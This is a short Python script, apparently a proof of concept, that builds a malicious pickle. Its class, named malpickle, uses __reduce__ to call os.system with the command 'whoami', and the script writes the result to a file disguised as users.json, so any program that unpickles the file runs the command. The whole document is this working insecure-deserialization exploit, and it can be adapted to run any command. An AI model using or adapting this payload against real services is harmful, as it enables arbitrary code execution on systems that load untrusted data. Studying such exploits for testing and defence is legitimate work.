import pickle
import os
class malpickle(object):
	def __reduce__(self):
		return (os.system, ("whoami",))
pickle_data = pickle.dumps(malpickle())
with open("users.json", "wb") as file:
	file.write(pickle_data)



